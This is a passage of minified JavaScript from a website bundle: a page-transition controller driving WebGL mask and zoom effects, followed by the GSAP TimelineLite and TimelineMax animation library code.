Flag__Back,this.new,this.__Flag__Back=!1,"single"===this.new&&("single"!=this.old&&"works"!=this.old&&(isMobileFixed.any?styleMobile.onScrollTo(1.4*this.anim.scroll.in.s,Power3.easeInOut,80):fakeScroll.onScrollTo(this.anim.scroll.in.s,Power2.easeInOut,.25*__WH__)),"home"==this.old||isMobileFixed.any||(backGL.material.uniforms.tDiffuse.value=backGL.__SINGLE__.fbo.texture,backGL.__SINGLE__.onLoadSingleFv())),isMobileFixed.any&&styleMobile.onEnter(),frontGL.__MASK__.__Flag__slideIn__&&!isMobileFixed.any)switch(frontGL.__MASK__.type){case 0:frontGL.__MASK__.center_to_top(1.3*this.anim.mask.out.s,this.anim.mask.out.e);break;case 1:frontGL.__MASK__.center_to_right(1.3*this.anim.mask.out.s,this.anim.mask.out.e);break;case 2:frontGL.__MASK__.center_to_left(1.3*this.anim.mask.out.s,this.anim.mask.out.e);break;case 3:frontGL.__MASK__.center_to_top(1.3*this.anim.mask.out.s,this.anim.mask.out.e)}e(),this.render=!0,loading.__Flag_complete__&&("home"!=this.new?(styleProgress.onRotate(0),styleProgress.setProgress(0)):styleProgress.onProgressTo(100/backGL.__HOME__.total,this.anim.progress.in.s,this.anim.progress.in.e)),clearTimeout(this.anim.mask.timer),this.anim.mask.timer=setTimeout((function(){$html.classList.remove("is-page-tr-start")}),1e3*this.anim.mask.in.s)},timer:{leave:null,native:null,type:null},tween:{enter:null,leave:null},onBeforeLeave:function(t){if(key.__Flag_down__)return!1;"single"===__PAGE_TYPE__&&backGL.__SINGLE__.onFadeOut(this.anim.tr.out.s,this.anim.tr.out.e)},onLeave:function(t,e){if(key.__Flag_down__)return!1;this.__Flag__start=!0,this.tween.leave&&this.tween.leave.kill(),this.tween.leave=TweenLite.to(".js--slide-up",this.anim.tr.out.s,{y:"-130%",ease:this.anim.tr.out.e}),this.__Flag__Back&&this.onHistoryBackTransition(),isMobileFixed.any?(clearTimeout(this.timer.leave),this.timer.leave=setTimeout((function(){e()}),1e3*this.anim.tr.out.s)):"footer"===this.type||"menu"===this.type?e():(clearTimeout(this.timer.leave),this.timer.leave=setTimeout((function(){e()}),1e3*this.anim.tr.out.s)),styleMenu.__Flag_open__&&styleMenu.onClose(),styleProgress.__Flag_count__&&styleProgress.onReset()},onHistoryBackTransition:function(){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onProgressTo(0,this.anim.mask.in.s,Power2.easeInOut),this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e)))},onHomeToSingleTransition:function(){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onLeave(),this.type="normal",$html.classList.add("is-tr-type-"+this.type),void(backGL.__HOME__.zoom.enable||isMobileFixed.any||"home"!==__PAGE_TYPE__||(backGL.__HOME__.zoom.enable=!0,backGL.__HOME__.onZoomIn(backGL.__HOME__.center.index,this.anim.zoom.in.s,this.anim.zoom.in.e),backGL.onZoomIn(this.anim.zoom.in.s),frontGL.__HOME__.onZoomIn(this.anim.zoom.in.s,this.anim.zoom.in.e))))},onHomeToSingleTransitionByLink:function(t){if(key.__Flag_down__)return!1;if(!loading.__Flag_complete__)return!1;var e=document.querySelectorAll(".page-title._active");if(e.length||(e=document.querySelectorAll(".page-title")),e.length){var i=e[0].querySelectorAll("a")[0].getAttribute("href");t.push({path:i}),styleProgress.onLeave(),this.type="normal",$html.classList.add("is-tr-type-"+this.type),isMobileFixed.any&&(this.render=!1),backGL.__HOME__.zoom.enable||isMobileFixed.any||"home"!==__PAGE_TYPE__||(backGL.__HOME__.zoom.enable=!0,backGL.__HOME__.onZoomIn(backGL.__HOME__.center.index,this.anim.zoom.in.s,this.anim.zoom.in.e),backGL.onZoomIn(this.anim.zoom.in.s),frontGL.__HOME__.onZoomIn(this.anim.zoom.in.s,this.anim.zoom.in.e))}},onNormalTransition:function(t){if(key.__Flag_down__)return!1;if(!loading.__Flag_complete__)return!1;if("home"===__PAGE_TYPE__&&"home"===t)location.reload();else if(styleMenu.__Flag_open__){this.onDestroy();var e=frontGL.__LOGO__.transform.zoom_before_normal;"about"!==t&&"contact"!==t||(e=frontGL.__LOGO__.transform.zoom_before_pages),frontGL.__LOGO__.setTransForm(e),this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,isMobileFixed.any||frontGL.__MASK__.bottom_to_center(0,this.anim.mask.in.e)}else this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,isMobileFixed.any||frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e)},onListTransition:function(t){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onLeave(),this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e)))},onMenuTransition:function(t){if(key.__Flag_down__)return!1;if(!loading.__Flag_complete__)return!1;styleProgress.onLeave(),this.onDestroy();var e=frontGL.__LOGO__.transform.zoom_before_normal;"about"!==t&&"contact"!==t||(e=frontGL.__LOGO__.transform.zoom_before_pages,$html.classList.add("is-tr-to-subpages")),frontGL.__LOGO__.setTransForm(e),this.type="menu",$html.classList.add("is-tr-type-"+this.type),backGL.__HOME__.zoom.enable||isMobileFixed.any||"home"!==__PAGE_TYPE__||(backGL.__HOME__.zoom.enable=!0,backGL.__HOME__.onZoomIn(backGL.__HOME__.center.index,0,this.anim.zoom.in.e),backGL.onZoomIn(0),frontGL.__HOME__.onZoomIn(0,this.anim.zoom.in.e)),styleMenu.__Flag_open__&&styleMenu.onClose()},onFooterTransition:function(t){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.__Flag_count_complete__||styleProgress.onLeave(),this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e)))},onFooterTransitionWithAnimation:function(t,e){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onLeave(),this.type="footer",$html.classList.add("is-tr-type-"+this.type),void(isMobileFixed.any?t.push({path:e}):(frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e),backGL.__FOOTER__.chengeAnim(1,.5,!1),clearTimeout(this.timer.native),this.timer.native=setTimeout((function(){t.push({path:e})}),1e3))))},onNextToTransition:function(){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onProgressTo(0,this.anim.mask.in.s,this.anim.mask.in.e),this.type="pagging",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||frontGL.__MASK__.left_to_center(this.anim.mask.in.s,this.anim.mask.in.e)))},onPrevToTransition:function(){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(styleProgress.onProgressTo(0,this.anim.mask.in.s,this.anim.mask.in.e),this.type="pagging",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||frontGL.__MASK__.right_to_center(this.anim.mask.in.s,this.anim.mask.in.e)))},onSelectTransition:function(t,e){if(!loading.__Flag_complete__)return!1;this.type="normal",$html.classList.add("is-tr-type-"+this.type),this.render=!1,isMobileFixed.any||frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e),t.push({path:e})},onLangTransition:function(t,e){return!key.__Flag_down__&&!!loading.__Flag_complete__&&(this.type="lang",$html.classList.add("is-tr-type-"+this.type),this.render=!1,void(isMobileFixed.any||styleMenu.__Flag_open__?t.push({path:e}):(frontGL.__MASK__.bottom_to_center(this.anim.mask.in.s,this.anim.mask.in.e),clearTimeout(this.timer.native),this.timer.native=setTimeout((function(){t.push({path:e})}),1e3*this.anim.mask.in.s))))}}},,function(t,e,i){"use strict";i.r(e),i(4),i(25),i(60);var n=i(1),r=i(7);n._gsScope._gsDefine("TimelineLite",["core.Animation","core.SimpleTimeline","TweenLite"],(function(){var t=function(t){n.SimpleTimeline.call(this,t);var e,i,r=this.vars;for(i in this._labels={},this.autoRemoveChildren=!!r.autoRemoveChildren,this.smoothChildTiming=!!r.smoothChildTiming,this._sortChildren=!0,this._onUpdate=r.onUpdate,r)e=r[i],o(e)&&-1!==e.join("").indexOf("{self}")&&(r[i]=this._swapSelfInParams(e));o(r.tweens)&&this.add(r.tweens,0,r.align,r.stagger)},e=n.default._internals,i=t._internals={},a=e.isSelector,o=e.isArray,s=e.lazyTweens,l=e.lazyRender,c=n._gsScope._gsDefine.globals,h=function(t){var e,i={};for(e in t)i[e]=t[e];return i},u=function(t,e,i){var n,r,a=t.cycle;for(n in a)r=a[n],t[n]="function"==typeof r?r(i,e[i],e):r[i%r.length];delete t.cycle},d=i.pauseCallback=function(){},p=function(t,e,i,n){var r="immediateRender";return r in e||(e[r]=!(i&&!1===i[r]||n)),e},f=function(t){if("function"==typeof t)return t;var e="object"===Object(r.a)(t)?t:{each:t},i=e.ease,n=e.from||0,a=e.base||0,o={},s=isNaN(n),l=e.axis,c={center:.5,end:1}[n]||0;return function(t,r,h){var u,d,p,f,m,_,g,v,y,x=(h||e).length,b=o[x];if(!b){if(!(y="auto"===e.grid?0:(e.grid||[1/0])[0])){for(g=-1/0;g<(g=h[y++].getBoundingClientRect().left)&&y<x;);y--}for(b=o[x]=[],u=s?Math.min(y,x)*c-.5:n%y,d=s?x*c/y-.5:n/y|0,g=0,v=1/0,_=0;_<x;_++)p=_%y-u,f=d-(_/y|0),b[_]=m=l?Math.abs("y"===l?f:p):Math.sqrt(p*p+f*f),m>g&&(g=m),m<v&&(v=m);b.max=g-v,b.min=v,b.v=x=e.amount||e.each*(y>x?x:l?"y"===l?x/y:y:Math.max(y,x/y))||0,b.b=x<0?a-x:a}return x=(b[t]-b.min)/b.max,b.b+(i?i.getRatio(x):x)*b.v}},m=t.prototype=new n.SimpleTimeline;return t.version="2.1.2",t.distribute=f,m.constructor=t,m.kill()._gc=m._forcingPlayhead=m._hasPause=!1,m.to=function(t,e,i,r){var a=i.repeat&&c.TweenMax||n.default;return e?this.add(new a(t,e,i),r):this.set(t,i,r)},m.from=function(t,e,i,r){return this.add((i.repeat&&c.TweenMax||n.default).from(t,e,p(0,i)),r)},m.fromTo=function(t,e,i,r,a){var o=r.repeat&&c.TweenMax||n.default;return r=p(0,r,i),e?this.add(o.fromTo(t,e,i,r),a):this.set(t,r,a)},m.staggerTo=function(e,i,r,o,s,l,c,d){var p,m,_=new t({onComplete:l,onCompleteParams:c,callbackScope:d,smoothChildTiming:this.smoothChildTiming}),g=f(r.stagger||o),v=r.startAt,y=r.cycle;for("string"==typeof e&&(e=n.default.selector(e)||e),a(e=e||[])&&(e=function(t){var e,i=[],n=t.length;for(e=0;e!==n;i.push(t[e++]));return i}(e)),m=0;m<e.length;m++)p=h(r),v&&(p.startAt=h(v),v.cycle&&u(p.startAt,e,m)),y&&(u(p,e,m),null!=p.duration&&(i=p.duration,delete p.duration)),_.to(e[m],i,p,g(m,e[m],e));return this.add(_,s)},m.staggerFrom=function(t,e,i,n,r,a,o,s){return i.runBackwards=!0,this.staggerTo(t,e,p(0,i),n,r,a,o,s)},m.staggerFromTo=function(t,e,i,n,r,a,o,s,l){return n.startAt=i,this.staggerTo(t,e,p(0,n,i),r,a,o,s,l)},m.call=function(t,e,i,r){return this.add(n.default.delayedCall(0,t,e,i),r)},m.set=function(t,e,i){return this.add(new n.default(t,0,p(0,e,null,!0)),i)},t.exportRoot=function(e,i){null==(e=e||{}).smoothChildTiming&&(e.smoothChildTiming=!0);var r,a,o,s,l=new t(e),c=l._timeline;for(null==i&&(i=!0),c._remove(l,!0),l._startTime=0,l._rawPrevTime=l._time=l._totalTime=c._time,o=c._first;o;)s=o._next,i&&o instanceof n.default&&o.target===o.vars.onComplete||((a=o._startTime-o._delay)<0&&(r=1),l.add(o,a)),o=s;return c.add(l,0),r&&l.totalDuration(),l},m.add=function(e,i,r,a){var s,l,c,h,u,d;if("number"!=typeof i&&(i=this._parseTimeOrLabel(i,0,!0,e)),!(e instanceof n.Animation)){if(e instanceof Array||e&&e.push&&o(e)){for(r=r||"normal",a=a||0,s=i,l=e.length,c=0;c<l;c++)o(h=e[c])&&(h=new t({tweens:h})),this.add(h,s),"string"!=typeof h&&"function"!=typeof h&&("sequence"===r?s=h._startTime+h.totalDuration()/h._timeScale:"start"===r&&(h._startTime-=h.delay())),s+=a;return this._uncache(!0)}if("string"==typeof e)return this.addLabel(e,i);if("function"!=typeof e)throw"Cannot add "+e+" into the timeline; it is not a tween, timeline, function, or string.";e=n.default.delayedCall(0,e)}if(n.SimpleTimeline.prototype.add.call(this,e,i),(e._time||!e._duration&&e._initted)&&(s=(this.rawTime()-e._startTime)*e._timeScale,(!e._duration||Math.abs(Math.max(0,Math.min(e.totalDuration(),s)))-e._totalTime>1e-5)&&e.render(s,!1,!1)),(this._gc||this._time===this._duration)&&!this._paused&&this._duration<this.duration())for(d=(u=this).rawTime()>e._startTime;u._timeline;)d&&u._timeline.smoothChildTiming?u.totalTime(u._totalTime,!0):u._gc&&u._enabled(!0,!1),u=u._timeline;return this},m.remove=function(t){if(t instanceof n.Animation){this._remove(t,!1);var e=t._timeline=t.vars.useFrames?n.Animation._rootFramesTimeline:n.Animation._rootTimeline;return t._startTime=(t._paused?t._pauseTime:e._time)-(t._reversed?t.totalDuration()-t._totalTime:t._totalTime)/t._timeScale,this}if(t instanceof Array||t&&t.push&&o(t)){for(var i=t.length;--i>-1;)this.remove(t[i]);return this}return"string"==typeof t?this.removeLabel(t):this.kill(null,t)},m._remove=function(t,e){return n.SimpleTimeline.prototype._remove.call(this,t,e),this._last?this._time>this.duration()&&(this._time=this._duration,this._totalTime=this._totalDuration):this._time=this._totalTime=this._duration=this._totalDuration=0,this},m.append=function(t,e){return this.add(t,this._parseTimeOrLabel(null,e,!0,t))},m.insert=m.insertMultiple=function(t,e,i,n){return this.add(t,e||0,i,n)},m.appendMultiple=function(t,e,i,n){return this.add(t,this._parseTimeOrLabel(null,e,!0,t),i,n)},m.addLabel=function(t,e){return this._labels[t]=this._parseTimeOrLabel(e),this},m.addPause=function(t,e,i,r){var a=n.default.delayedCall(0,d,i,r||this);return a.vars.onComplete=a.vars.onReverseComplete=e,a.data="isPause",this._hasPause=!0,this.add(a,t)},m.removeLabel=function(t){return delete this._labels[t],this},m.getLabelTime=function(t){return null!=this._labels[t]?this._labels[t]:-1},m._parseTimeOrLabel=function(t,e,i,r){var a,s;if(r instanceof n.Animation&&r.timeline===this)this.remove(r);else if(r&&(r instanceof Array||r.push&&o(r)))for(s=r.length;--s>-1;)r[s]instanceof n.Animation&&r[s].timeline===this&&this.remove(r[s]);if(a="number"!=typeof t||e?this.duration()>99999999999?this.recent().endTime(!1):this._duration:0,"string"==typeof e)return this._parseTimeOrLabel(e,i&&"number"==typeof t&&null==this._labels[e]?t-a:0,i);if(e=e||0,"string"!=typeof t||!isNaN(t)&&null==this._labels[t])null==t&&(t=a);else{if(-1===(s=t.indexOf("=")))return null==this._labels[t]?i?this._labels[t]=a+e:e:this._labels[t]+e;e=parseInt(t.charAt(s-1)+"1",10)*Number(t.substr(s+1)),t=s>1?this._parseTimeOrLabel(t.substr(0,s-1),0,i):a}return Number(t)+e},m.seek=function(t,e){return this.totalTime("number"==typeof t?t:this._parseTimeOrLabel(t),!1!==e)},m.stop=function(){return this.paused(!0)},m.gotoAndPlay=function(t,e){return this.play(t,e)},m.gotoAndStop=function(t,e){return this.pause(t,e)},m.render=function(t,e,i){this._gc&&this._enabled(!0,!1);var n,r,a,o,c,h,u,d,p=this._time,f=this._dirty?this.totalDuration():this._totalDuration,m=this._startTime,_=this._timeScale,g=this._paused;if(p!==this._time&&(t+=this._time-p),t>=f-1e-8&&t>=0)this._totalTime=this._time=f,this._reversed||this._hasPausedChild()||(r=!0,o="onComplete",c=!!this._timeline.autoRemoveChildren,0===this._duration&&(t<=0&&t>=-1e-8||this._rawPrevTime<0||1e-8===this._rawPrevTime)&&this._rawPrevTime!==t&&this._first&&(c=!0,this._rawPrevTime>1e-8&&(o="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:1e-8,t=f+1e-4;else if(t<1e-8)if(this._totalTime=this._time=0,t>-1e-8&&(t=0),(0!==p||0===this._duration&&1e-8!==this._rawPrevTime&&(this._rawPrevTime>0||t<0&&this._rawPrevTime>=0))&&(o="onReverseComplete",r=this._reversed),t<0)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(c=r=!0,o="onReverseComplete"):this._rawPrevTime>=0&&this._first&&(c=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:1e-8,0===t&&r)for(n=this._first;n&&0===n._startTime;)n._duration||(r=!1),n=n._next;t=0,this._initted||(c=!0)}else{if(this._hasPause&&!this._forcingPlayhead&&!e){if(t>=p)for(n=this._first;n&&n._startTime<=t&&!h;)n._duration||"isPause"!==n.data||n.ratio||0===n._startTime&&0===this._rawPrevTime||(h=n),n=n._next;else for(n=this._last;n&&n._startTime>=t&&!h;)n._duration||"isPause"===n.data&&n._rawPrevTime>0&&(h=n),n=n._prev;h&&(this._time=this._totalTime=t=h._startTime,d=this._startTime+t/this._timeScale)}this._totalTime=this._time=this._rawPrevTime=t}if(this._time!==p&&this._first||i||c||h){if(this._initted||(this._initted=!0),this._active||!this._paused&&this._time!==p&&t>0&&(this._active=!0),0===p&&this.vars.onStart&&(0===this._time&&this._duration||e||this._callback("onStart")),(u=this._time)>=p)for(n=this._first;n&&(a=n._next,u===this._time&&(!this._paused||g));)(n._active||n._startTime<=u&&!n._paused&&!n._gc)&&(h===n&&(this.pause(),this._pauseTime=d),n._reversed?n.render((n._dirty?n.totalDuration():n._totalDuration)-(t-n._startTime)*n._timeScale,e,i):n.render((t-n._startTime)*n._timeScale,e,i)),n=a;else for(n=this._last;n&&(a=n._prev,u===this._time&&(!this._paused||g));){if(n._active||n._startTime<=p&&!n._paused&&!n._gc){if(h===n){for(h=n._prev;h&&h.endTime()>this._time;)h.render(h._reversed?h.totalDuration()-(t-h._startTime)*h._timeScale:(t-h._startTime)*h._timeScale,e,i),h=h._prev;h=null,this.pause(),this._pauseTime=d}n._reversed?n.render((n._dirty?n.totalDuration():n._totalDuration)-(t-n._startTime)*n._timeScale,e,i):n.render((t-n._startTime)*n._timeScale,e,i)}n=a}this._onUpdate&&(e||(s.length&&l(),this._callback("onUpdate"))),o&&(this._gc||m!==this._startTime&&_===this._timeScale||(0===this._time||f>=this.totalDuration())&&(r&&(s.length&&l(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[o]&&this._callback(o)))}},m._hasPausedChild=function(){for(var e=this._first;e;){if(e._paused||e instanceof t&&e._hasPausedChild())return!0;e=e._next}return!1},m.getChildren=function(t,e,i,r){r=r||-9999999999;for(var a=[],o=this._first,s=0;o;)o._startTime<r||(o instanceof n.default?!1!==e&&(a[s++]=o):(!1!==i&&(a[s++]=o),!1!==t&&(s=(a=a.concat(o.getChildren(!0,e,i))).length))),o=o._next;return a},m.getTweensOf=function(t,e){var i,r,a=this._gc,o=[],s=0;for(a&&this._enabled(!0,!0),r=(i=n.default.getTweensOf(t)).length;--r>-1;)(i[r].timeline===this||e&&this._contains(i[r]))&&(o[s++]=i[r]);return a&&this._enabled(!1,!0),o},m.recent=function(){return this._recent},m._contains=function(t){for(var e=t.timeline;e;){if(e===this)return!0;e=e.timeline}return!1},m.shiftChildren=function(t,e,i){i=i||0;for(var n,r=this._first,a=this._labels;r;)r._startTime>=i&&(r._startTime+=t),r=r._next;if(e)for(n in a)a[n]>=i&&(a[n]+=t);return this._uncache(!0)},m._kill=function(t,e){if(!t&&!e)return this._enabled(!1,!1);for(var i=e?this.getTweensOf(e):this.getChildren(!0,!0,!1),n=i.length,r=!1;--n>-1;)i[n]._kill(t,e)&&(r=!0);return r},m.clear=function(t){var e=this.getChildren(!1,!0,!0),i=e.length;for(this._time=this._totalTime=0;--i>-1;)e[i]._enabled(!1,!1);return!1!==t&&(this._labels={}),this._uncache(!0)},m.invalidate=function(){for(var t=this._first;t;)t.invalidate(),t=t._next;return n.Animation.prototype.invalidate.call(this)},m._enabled=function(t,e){if(t===this._gc)for(var i=this._first;i;)i._enabled(t,!0),i=i._next;return n.SimpleTimeline.prototype._enabled.call(this,t,e)},m.totalTime=function(t,e,i){this._forcingPlayhead=!0;var r=n.Animation.prototype.totalTime.apply(this,arguments);return this._forcingPlayhead=!1,r},m.duration=function(t){return arguments.length?(0!==this.duration()&&0!==t&&this.timeScale(this._duration/t),this):(this._dirty&&this.totalDuration(),this._duration)},m.totalDuration=function(t){if(!arguments.length){if(this._dirty){for(var e,i,n=0,r=this,a=r._last,o=999999999999;a;)e=a._prev,a._dirty&&a.totalDuration(),a._startTime>o&&r._sortChildren&&!a._paused&&!r._calculatingDuration?(r._calculatingDuration=1,r.add(a,a._startTime-a._delay),r._calculatingDuration=0):o=a._startTime,a._startTime<0&&!a._paused&&(n-=a._startTime,r._timeline.smoothChildTiming&&(r._startTime+=a._startTime/r._timeScale,r._time-=a._startTime,r._totalTime-=a._startTime,r._rawPrevTime-=a._startTime),r.shiftChildren(-a._startTime,!1,-9999999999),o=0),(i=a._startTime+a._totalDuration/a._timeScale)>n&&(n=i),a=e;r._duration=r._totalDuration=n,r._dirty=!1}return this._totalDuration}return t&&this.totalDuration()?this.timeScale(this._totalDuration/t):this},m.paused=function(t){if(!1===t&&this._paused)for(var e=this._first;e;)e._startTime===this._time&&"isPause"===e.data&&(e._rawPrevTime=0),e=e._next;return n.Animation.prototype.paused.apply(this,arguments)},m.usesFrames=function(){for(var t=this._timeline;t._timeline;)t=t._timeline;return t===n.Animation._rootFramesTimeline},m.rawTime=function(t){return t&&(this._paused||this._repeat&&this.time()>0&&this.totalProgress()<1)?this._totalTime%(this._duration+this._repeatDelay):this._paused?this._totalTime:(this._timeline.rawTime(t)-this._startTime)*this._timeScale},t}),!0);var a=n.globals.TimelineLite;i.d(e,"TimelineMax",(function(){return o})),i.d(e,"default",(function(){return o})),i.d(e,"TimelineLite",(function(){return a})),n._gsScope._gsDefine("TimelineMax",["TimelineLite","TweenLite","easing.Ease"],(function(){var t=function(t){a.call(this,t),this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._cycle=0,this._yoyo=!!this.vars.yoyo,this._dirty=!0},e=n.default._internals,i=e.lazyTweens,r=e.lazyRender,o=n._gsScope._gsDefine.globals,s=new n.Ease(null,null,1,0),l=t.prototype=new a;return l.constructor=t,l.kill()._gc=!1,t.version="2.1.2",l.invalidate=function(){return this._yoyo=!!this.vars.yoyo,this._repeat=this.vars.repeat||0,this._repeatDelay=this.vars.repeatDelay||0,this._uncache(!0),a.prototype.invalidate.call(this)},l.addCallback=function(t,e,i,r){return this.add(n.default.delayedCall(0,t,i,r),e)},l.removeCallback=function(t,e){if(t)if(null==e)this._kill(null,t);else for(var i=this.getTweensOf(t,!1),n=i.length,r=this._parseTimeOrLabel(e);--n>-1;)i[n]._startTime===r&&i[n]._enabled(!1,!1);return this},l.removePause=function(t){return this.removeCallback(a._internals.pauseCallback,t)},l.tweenTo=function(t,e){e=e||{};var i,r,a,l={ease:s,useFrames:this.usesFrames(),immediateRender:!1,lazy:!1},c=e.repeat&&o.TweenMax||n.default;for(r in e)l[r]=e[r];return l.time=this._parseTimeOrLabel(t),i=Math.abs(Number(l.time)-this._time)/this._timeScale||.001,a=new c(this,i,l),l.onStart=function(){a.target.paused(!0),a.vars.time===a.target.time()||i!==a.duration()||a.isFromTo||a.duration(Math.abs(a.vars.time-a.target.time())/a.target._timeScale).render(a.time(),!0,!0),e.onStart&&e.onStart.apply(e.onStartScope||e.callbackScope||a,e.onStartParams||[])},a},l.tweenFromTo=function(t,e,i){i=i||{},t=this._parseTimeOrLabel(t),i.startAt={onComplete:this.seek,onCompleteParams:[t],callbackScope:this},i.immediateRender=!1!==i.immediateRender;var n=this.tweenTo(e,i);return n.isFromTo=1,n.duration(Math.abs(n.vars.time-t)/this._timeScale||.001)},l.render=function(t,e,n){this._gc&&this._enabled(!0,!1);var a,o,s,l,c,h,u,d,p,f=this._time,m=this._dirty?this.totalDuration():this._totalDuration,_=this._duration,g=this._totalTime,v=this._startTime,y=this._timeScale,x=this._rawPrevTime,b=this._paused,w=this._cycle;if(f!==this._time&&(t+=this._time-f),t>=m-1e-8&&t>=0)this._locked||(this._totalTime=m,this._cycle=this._repeat),this._reversed||this._hasPausedChild()||(o=!0,l="onComplete",c=!!this._timeline.autoRemoveChildren,0===this._duration&&(t<=0&&t>=-1e-8||x<0||1e-8===x)&&x!==t&&this._first&&(c=!0,x>1e-8&&(l="onReverseComplete"))),this._rawPrevTime=this._duration||!e||t||this._rawPrevTime===t?t:1e-8,this._yoyo&&1&this._cycle?this._time=t=0:(this._time=_,t=_+1e-4);else if(t<1e-8)if(this._locked||(this._totalTime=this._cycle=0),this._time=0,t>-1e-8&&(t=0),(0!==f||0===_&&1e-8!==x&&(x>0||t<0&&x>=0)&&!this._locked)&&(l="onReverseComplete",o=this._reversed),t<0)this._active=!1,this._timeline.autoRemoveChildren&&this._reversed?(c=o=!0,l="onReverseComplete"):x>=0&&this._first&&(c=!0),this._rawPrevTime=t;else{if(this._rawPrevTime=_||!e||t||this._rawPrevTime===t?t:1e-8,0===t&&o)for(a=this._first;a&&0===a._startTime;)a._duration||(o=!1),a=a._next;t=0,this._initted||(c=!0)}else if(0===_&&x<0&&(c=!0),this._time=this._rawPrevTime=t,this._locked||(this._totalTime=t,0!==this._repeat&&(h=_+this._repeatDelay,this._cycle=this._totalTime/h>>0,this._cycle&&this._cycle===this._totalTime/h&&g<=t&&this._cycle--,this._time=this._totalTime-this._cycle*h,this._yoyo&&1&this._cycle&&(this._time=_-this._time),this._time>_?(this._time=_,t=_+1e-4):this._time<0?this._time=t=0:t=this._time)),this._hasPause&&!this._forcingPlayhead&&!e){if((t=this._time)>=f||this._repeat&&w!==this._cycle)for(a=this._first;a&&a._startTime<=t&&!u;)a._duration||"isPause"!==a.data||a.ratio||0===a._startTime&&0===this._rawPrevTime||(u=a),a=a._next;else for(a=this._last;a&&a._startTime>=t&&!u;)a._duration||"isPause"===a.data&&a._rawPrevTime>0&&(u=a),a=a._prev;u&&(p=this._startTime+u._startTime/this._timeScale,u._startTime<_&&(this._time=this._rawPrevTime=t=u._startTime,this._totalTime=t+this._cycle*(this._totalDuration+this._repeatDelay)))}if(this._cycle!==w&&!this._locked){var T=this._yoyo&&0!=(1&w),S=T===(this._yoyo&&0!=(1&this._cycle)),M=this._totalTime,E=this._cycle,L=this._rawPrevTime,k=this._time;if(this._totalTime=w*_,this._cycle<w?T=!T:this._totalTime+=_,this._time=f,this._rawPrevTime=0===_?x-1e-4:x,this._cycle=w,this._locked=!0,f=T?0:_,this.render(f,e,0===_),e||this._gc||this.vars.onRepeat&&(this._cycle=E,this._locked=!1,this._callback("onRepeat")),f!==this._time)return;if(S&&(this._cycle=w,this._locked=!0,f=T?_+1e-4:-1e-4,this.render(f,!0,!1)),this._locked=!1,this._paused&&!b)return;this._time=k,this._totalTime=M,this._cycle=E,this._rawPrevTime=L}if(this._time!==f&&this._first||n||c||u){if(this._initted||(this._initted=!0),this._active||!this._paused&&this._totalTime!==g&&t>0&&(this._active=!0),0===g&&this.vars.onStart&&(0===this._totalTime&&this._totalDuration||e||this._callback("onStart")),(d=this._time)>=f)for(a=this._first;a&&(s=a._next,d===this._time&&(!this._paused||b));)(a._active||a._startTime<=this._time&&!a._paused&&!a._gc)&&(u===a&&(this.pause(),this._pauseTime=p),a._reversed?a.render((a._dirty?a.totalDuration():a._totalDuration)-(t-a._startTime)*a._timeScale,e,n):a.render((t-a._startTime)*a._timeScale,e,n)),a=s;else for(a=this._last;a&&(s=a._prev,d===this._time&&(!this._paused||b));){if(a._active||a._startTime<=f&&!a._paused&&!a._gc){if(u===a){for(u=a._prev;u&&u.endTime()>this._time;)u.render(u._reversed?u.totalDuration()-(t-u._startTime)*u._timeScale:(t-u._startTime)*u._timeScale,e,n),u=u._prev;u=null,this.pause(),this._pauseTime=p}a._reversed?a.render((a._dirty?a.totalDuration():a._totalDuration)-(t-a._startTime)*a._timeScale,e,n):a.render((t-a._startTime)*a._timeScale,e,n)}a=s}this._onUpdate&&(e||(i.length&&r(),this._callback("onUpdate"))),l&&(this._locked||this._gc||v!==this._startTime&&y===this._timeScale||(0===this._time||m>=this.totalDuration())&&(o&&(i.length&&r(),this._timeline.autoRemoveChildren&&this._enabled(!1,!1),this._active=!1),!e&&this.vars[l]&&this._callback(l)))}else g!==this._totalTime&&this._onUpdate&&(e||this._callback("onUpdate"))},l.getActive=function(t,e,i){var n,r,a=[],o=this.getChildren(t||null==t,e||null==t,!!i),s=0,l=o.length;for(n=0;n<l;n++)(r=o[n]).isActive()&&(a[s++]=r);return a},l.getLabelAfter=function(t){t||0!==t&&(t=this._time);var e,i=this.getLabelsArray(),n=i.length;for(e=0;e<n;e++)if(i[e].time>t)return i[e].name;return null},l.getLabelBefore=function(t){null==t&&(t=this._time);for(var e=this.getLabelsArray(),i=e.length;--i>-1;)if(e[i].time<t)return e[i].name;return null},l.getLabelsArray=function(){var t,e=[],i=0;for(t in this._labels)e[i++]={time:this._labels[t],name:t};return e.sort((function(t,e){return t.time-e.time})),e},l.invalidate=function(){return this._locked=!1,a.prototype.invalidate.call(this)},l.progress=function(t,e){return 